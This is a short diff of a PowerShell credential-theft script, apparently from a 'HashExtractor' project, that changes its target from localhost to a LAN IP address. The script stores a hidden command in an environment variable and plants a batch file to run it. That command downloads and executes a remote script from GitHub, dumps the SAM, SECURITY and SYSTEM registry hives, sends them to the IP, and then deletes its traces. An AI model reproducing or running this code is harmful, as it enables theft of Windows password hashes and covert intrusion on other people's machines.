@@ -1,5 +1,5 @@
 ﻿
-$ip = 'localhost'
+$ip = '192.168.178.21'
 $Value = "powershell -windowstyle hidden `$b=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1' -UseBasicParsing).Content);IEX `$b;reg save HKLM\sam C:\Users\Public\1;reg save HKLM\security C:\Users\Public\2;reg save HKLM\system C:\Users\Public\3;Invoke-Transmission -ip $ip;Remove-Item 'C:\Users\Public\A.bat';Remove-Item 'C:\Users\Public\1';Remove-Item 'C:\Users\Public\2';Remove-Item 'C:\Users\Public\3';[System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User)"
 [System.Environment]::SetEnvironmentVariable('A', $Value,[System.EnvironmentVariableTarget]::User)
 New-Item -Path 'C:\Users\Public\A.bat' -Value '%A%'
